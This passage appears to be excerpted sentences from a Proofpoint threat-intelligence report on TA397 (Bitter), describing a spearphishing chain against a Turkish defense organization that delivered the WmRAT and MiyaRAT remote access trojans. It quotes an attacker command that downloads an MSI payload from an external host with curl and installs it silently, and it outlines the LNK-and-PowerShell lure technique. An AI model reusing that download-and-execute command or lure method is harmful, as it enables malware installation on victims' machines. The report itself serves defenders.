span_sentences: On November 18, 2024, TA397 (also known by third-party researchers as Bitter) targeted a defense sector organization in Turkey with a spearphishing lure.
- TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain.

This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.

Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:
curl -o C:\users\public\music\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\users\public\music\gfxview.msi /qn /norestart
This acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload.
MiyaRAT is also written in C++ and contains similar functionality to WmRAT.
Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397.
It is also clear that MiyaRAT is the newer of the two tools in their arsenal.
Proofpoint assesses MiyaRAT may be reserved for targets TA397 deems high value due to the observed sporadic deployment of the malware in only a certain number of campaigns.

The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.
This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”.

The RAT can gather basic host information, upload or download files, take screenshots, get geolocation data of the target machine, enumerate directories and files, and run arbitrary commands via cmd or PowerShell.
